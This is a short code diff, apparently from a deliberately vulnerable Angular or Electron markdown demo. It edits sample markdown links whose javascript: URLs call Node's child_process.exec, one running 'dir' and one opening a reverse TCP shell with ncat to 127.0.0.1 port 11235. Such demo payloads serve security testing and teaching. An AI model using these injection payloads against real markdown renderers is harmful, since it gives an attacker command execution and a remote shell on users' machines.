@@ -26,7 +26,7 @@ export class MarkdownComponent implements AfterViewInit {
 
 [RCE - dir](javascript:require('child_process').exec('dir',function(e,r){alert(r)}))
 
-[RCE - Reverse TCP Shell](javascript:require('child_process').exec('nc.exe%20127.0.0.1%2011235%20-e%20cmd.exe'))
+[RCE - Reverse TCP Shell](javascript:require('child_process').exec('ncat%20127.0.0.1%2011235%20-e%20cmd.exe'))
 
 #### Notes
 
